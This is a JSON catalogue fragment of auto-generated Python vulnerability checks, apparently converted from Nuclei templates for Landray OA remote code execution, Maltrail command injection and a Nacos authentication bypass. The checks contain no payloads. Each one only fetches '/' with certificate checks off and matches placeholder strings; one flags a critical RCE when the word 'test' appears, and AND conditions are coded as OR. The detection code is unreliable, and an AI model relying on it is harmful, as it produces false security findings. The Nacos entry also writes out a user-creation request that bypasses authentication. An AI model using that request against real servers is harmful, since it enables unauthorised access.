        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: landray-oa-datajson-rce\nName: Landray OA Datajson S Bean - Remote Code Execution\nSeverity: critical\nDescription: Landray Office Automation (OA) software, specifically in the \"s_bean\" component's \"sysFormulaSimulateByJS\" functionality. This vulnerability allows remote code execution (RCE), enabling attackers to execute arbitrary code on a target system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_landray_oa_datajson_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"landray-oa-datajson-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray OA Datajson S Bean - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(interactsh_protocol, \"dns\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray OA Datajson S Bean - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_landray_oa_datajson_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "landray",
          "rce",
          "oast",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_landray_oa_erp_data_rce",
        "name": "Landray-OA - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Landray-OA `erp_data.jsp` is vulnerable to remote code execution vulnerability.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'dns' | mot(s) '{\"message\":\"' | mot(s) 'text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: landray-oa-erp-data-rce\nName: Landray-OA - Remote Code Execution\nSeverity: critical\nDescription: Landray-OA `erp_data.jsp` is vulnerable to remote code execution vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_landray_oa_erp_data_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"landray-oa-erp-data-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray-OA - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'dns\\' | mot(s) \\'{\"message\":\"\\' | mot(s) \\'text/html\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['dns', '{\"message\":\"', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray-OA - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_landray_oa_erp_data_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: landray-oa-erp-data-rce\nName: Landray-OA - Remote Code Execution\nSeverity: critical\nDescription: Landray-OA `erp_data.jsp` is vulnerable to remote code execution vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_landray_oa_erp_data_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"landray-oa-erp-data-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray-OA - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'dns\\' | mot(s) \\'{\"message\":\"\\' | mot(s) \\'text/html\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['dns', '{\"message\":\"', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray-OA - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_landray_oa_erp_data_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "landray",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_maltrail_rce",
        "name": "Maltrail <= v0.54 - Unauthenticated OS Command Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get(\"username\")parameter.\nAn attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body,'Login failed'); contains(interactsh_protocol,'dns')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "root_url",
            "datatype": "string",
            "required": false,
            "description": "URL racine sans chemin"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: maltrail-rce\nName: Maltrail <= v0.54 - Unauthenticated OS Command Injection\nSeverity: critical\nDescription: The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get(\"username\")parameter.\nAn attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_maltrail_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"maltrail-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Maltrail <= v0.54 - Unauthenticated OS Command Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(body,'Login failed'); contains(interactsh_protocol,'dns')\"\n\n        # Simple word matcher simulation\n        matchers = ['Login failed', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Maltrail <= v0.54 - Unauthenticated OS Command Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_maltrail_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: maltrail-rce\nName: Maltrail <= v0.54 - Unauthenticated OS Command Injection\nSeverity: critical\nDescription: The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get(\"username\")parameter.\nAn attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_maltrail_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"maltrail-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Maltrail <= v0.54 - Unauthenticated OS Command Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(body,'Login failed'); contains(interactsh_protocol,'dns')\"\n\n        # Simple word matcher simulation\n        matchers = ['Login failed', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Maltrail <= v0.54 - Unauthenticated OS Command Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_maltrail_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "huntr",
          "maltrail",
          "rce",
          "oast",
          "oos",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_nacos_auth_bypass",
        "name": "Nacos 1.x - Authentication Bypass",
        "language": "Python",
        "famille": "WebApp",
        "description": "Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"totalCount\":, \"username\":, \"password\":' | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
